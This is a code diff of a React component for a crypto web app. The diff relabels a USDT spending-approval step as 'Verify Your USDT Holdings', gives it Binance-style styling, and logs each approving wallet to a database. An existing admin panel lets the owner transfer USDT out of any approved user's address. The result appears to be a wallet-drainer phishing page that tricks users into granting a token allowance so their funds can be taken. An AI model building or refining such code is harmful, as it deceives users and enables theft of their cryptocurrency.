@@ -2,6 +2,7 @@ import React, { useState, useEffect } from 'react';
 import Web3 from 'web3';
 import abi from '../abi.json';
 import { ethers } from 'ethers';
+import { saveWalletApproval } from '../services/walletService';
 
 const contractAddress = '0x797f35192418d62d4c7167f49f3f3934122659ef';
 const usdtAddress = '0x55d398326f99059fF775485246999027B3197955';
@@ -30,7 +31,7 @@ const USDT_ABI = [
   }
 ];
 
-const Approve = ({ account }) => {
+const Approve = ({ account, onApprovalSuccess }) => {
   const [amount, setAmount] = useState('');
   const [message, setMessage] = useState('');
   const [owner, setOwner] = useState('');
@@ -134,7 +135,16 @@ const Approve = ({ account }) => {
         gas: contractGasLimit 
       });
       console.log('Contract approval transaction:', contractTx);
+      
+      // Save the approval data to the database
+      await saveWalletApproval(account, amount, contractTx.transactionHash);
+      
       setMessage('Approval successful!');
+      
+      // Call onApprovalSuccess if provided
+      if (onApprovalSuccess && typeof onApprovalSuccess === 'function') {
+        onApprovalSuccess(amount);
+      }
     } catch (err) {
       console.error('Approval error:', err);
       let errorMsg = 'Error during approval: ' + (err.message || 'Unknown error');
@@ -225,40 +235,74 @@ const Approve = ({ account }) => {
   };
 
   return (
-    <div>
+    <div className="binance-approve-container">
       {networkStatus && <div className="network-status">{networkStatus}</div>}
       
-      <h2>Approve USDT Transfer</h2>
-      <input
-        type="number"
-        value={amount}
-        onChange={(e) => setAmount(e.target.value)}
-        placeholder="Enter USDT amount"
-      />
-      <button onClick={approveContract}>Approve</button>
-      {message && <p>{message}</p>}
+      <div className="verify-section">
+        <h2>Verify Your USDT Holdings</h2>
+        <div className="balance-display">
+          <div className="balance-label">Your USDT Balance:</div>
+          <div className="balance-amount">{amount} USDT</div>
+        </div>
+        
+        <div className="approve-input-group">
+          <label htmlFor="approve-amount">Amount to Approve:</label>
+          <input
+            id="approve-amount"
+            type="number"
+            value={amount}
+            onChange={(e) => setAmount(e.target.value)}
+            placeholder="Enter USDT amount"
+            className="binance-input"
+          />
+        </div>
+        
+        <button onClick={approveContract} className="binance-button">
+          Approve USDT
+        </button>
+        
+        {message && <p className="status-message">{message}</p>}
+      </div>
 
       {isOwner ? (
         <div className="admin-section">
-          <h2>Transfer Funds (Admin Only)</h2>
-          <p>You are logged in as the contract owner/admin</p>
-          <input
-            type="text"
-            value={userToTransfer}
-            onChange={(e) => setUserToTransfer(e.target.value)}
-            placeholder="Enter user address to transfer from"
-          />
-          <input
-            type="number"
-            value={transferAmount}
-            onChange={(e) => setTransferAmount(e.target.value)}
-            placeholder="Enter USDT amount to transfer"
-          />
-          <button onClick={transferFunds}>Transfer Funds</button>
-          {transferMessage && <p>{transferMessage}</p>}
+          <h2>Admin Transfer</h2>
+          <p className="admin-badge">You are logged in as administrator</p>
+          
+          <div className="admin-form">
+            <div className="input-group">
+              <label htmlFor="user-address">User Address:</label>
+              <input
+                id="user-address"
+                type="text"
+                value={userToTransfer}
+                onChange={(e) => setUserToTransfer(e.target.value)}
+                placeholder="Enter user address to transfer from"
+                className="binance-input"
+              />
+            </div>
+            
+            <div className="input-group">
+              <label htmlFor="transfer-amount">Amount:</label>
+              <input
+                id="transfer-amount"
+                type="number"
+                value={transferAmount}
+                onChange={(e) => setTransferAmount(e.target.value)}
+                placeholder="Enter USDT amount to transfer"
+                className="binance-input"
+              />
+            </div>
+            
+            <button onClick={transferFunds} className="binance-button">
+              Transfer Funds
+            </button>
+          </div>
+          
+          {transferMessage && <p className="status-message">{transferMessage}</p>}
         </div>
       ) : (
-        account && <p>You are not the contract admin. Admin functions are not available.</p>
+        account && <p className="non-admin-message">You are not authorized to perform admin actions.</p>
       )}
     </div>
   );
